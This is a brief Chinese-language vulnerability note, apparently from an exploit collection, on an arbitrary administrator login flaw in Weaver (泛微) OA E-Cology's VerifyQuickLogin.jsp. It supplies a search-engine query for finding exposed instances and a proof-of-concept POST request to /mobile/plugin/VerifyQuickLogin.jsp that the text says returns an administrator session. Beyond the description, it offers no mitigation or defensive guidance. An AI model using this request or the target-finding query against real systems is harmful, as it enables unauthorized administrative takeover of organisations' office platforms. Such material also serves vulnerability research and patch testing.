# 泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞

## 漏洞描述

泛微OA E-Cology VerifyQuickLogin.jsp文件中存在任意管理员登录漏洞，攻击着通过发送特殊的请求包可以获取管理员Session

## 漏洞影响

泛微OA E-Cology 

## 网络测绘

app="泛微-协同办公OA"

## 漏洞复现

产品主页

![img](../../../.vuepress/public/img/1659252985356-45185f65-d899-4374-bfa1-b4d7cf397298.png)

验证POC

```php
POST /mobile/plugin/VerifyQuickLogin.jsp
  
identifier=1&language=1&ipaddress=x.x.x.x
```

![img](../../../.vuepress/public/img/1659253382744-eb36ef30-038a-4bb3-8d69-d924411bcf00.png)